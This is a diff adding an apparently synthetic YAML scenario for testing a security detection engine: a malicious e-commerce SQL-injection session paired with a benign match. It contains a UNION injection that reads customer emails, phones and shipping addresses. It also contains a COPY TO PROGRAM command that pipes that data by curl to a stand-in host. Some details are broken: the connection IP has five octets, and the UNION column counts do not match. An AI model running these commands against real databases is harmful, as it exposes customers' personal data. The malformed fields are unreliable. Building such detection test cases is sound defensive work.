@@ -1,0 +1,33 @@
+scenario_id: gen_ecommerce_28_sql_injection_mal_746m
+family_id: gen_ecommerce_28_sql_injection_fam_746
+domain: ecommerce
+time_of_day: 03:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT order_id, status FROM orders WHERE order_id = 0 UNION SELECT email,
+      phone, shipping_address FROM customers
+  - step_id: exfil
+    sql: COPY (SELECT email, phone, shipping_address FROM customers) TO PROGRAM 'curl
+      -sX POST https://customs-sync.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 193.42.33.79.162
+      port: 443
+matched_pair_id: gen_ecommerce_28_sql_injection_pair_746
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
